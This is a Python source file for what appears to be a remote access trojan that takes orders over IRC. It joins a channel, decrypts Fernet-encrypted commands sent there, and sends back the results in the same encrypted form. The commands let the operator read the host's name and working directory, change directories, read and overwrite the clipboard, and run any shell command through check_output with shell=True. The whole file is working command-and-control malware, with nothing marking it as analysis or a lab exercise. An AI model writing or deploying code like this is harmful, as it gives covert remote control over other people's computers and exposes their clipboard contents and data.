import socket
from cryptography import fernet
from os import getcwd, chdir
from subprocess import check_output,STDOUT
from time import sleep
from clipboard import paste , copy
def clearBuffer(sock,time):
    sock.settimeout(time)
    while 1:
        try:
            sock.recv(1000000)
        except socket.timeout :
            break
def processor(irc , server , channel , port , key , botnick):
    cryPobj=fernet.Fernet(key)
    irc.connect((server, port))
    irc.send(("USER "+ botnick +" "+ botnick +" "+ botnick +" :T\n").encode())
    irc.send(("NICK "+ botnick +"\n").encode())
    irc.send(("PRIVMSG nickserv :iNOOPE\r\n").encode())
    irc.send(("JOIN "+ channel +"\n").encode())
    clearBuffer(irc,11)
    irc.settimeout(None)
    def send(sock,msg):
        sock.send(f"PRIVMSG {channel} :REP:{(cryPobj.encrypt(msg.encode())).decode()}\r\n".encode())
    while 1:
        clearBuffer(irc,0.5)
        irc.settimeout(None)
        text=irc.recv(10024).decode()
        try:
            if "MSG:" in text:
                text=text.split("MSG:")[-1]
                text=cryPobj.decrypt(text.encode()).decode().strip()
                if text=="Gpwd" :
                    send(irc, socket.gethostname()+f"[{getcwd()}]")
                elif "cd" in text:
                    path=text.split("cd")[-1].strip()
                    if path:
                        chdir(path)
                        send(irc, "DONE :)")
                elif "wclipboard" in text:
                    text=text.strip().replace("CMD:", "").replace("wclipboard ", "")
                    copy(text)
                    send(irc, "DONE :)")
                elif "rclipboard" in text :
                    send(irc, paste())
                elif "CMD:" in text :
                    out=check_output(text.split("CMD:")[-1],stderr=STDOUT,shell=True)
                    send(irc, out.decode())
        except Exception as err :
            send(irc, str(err))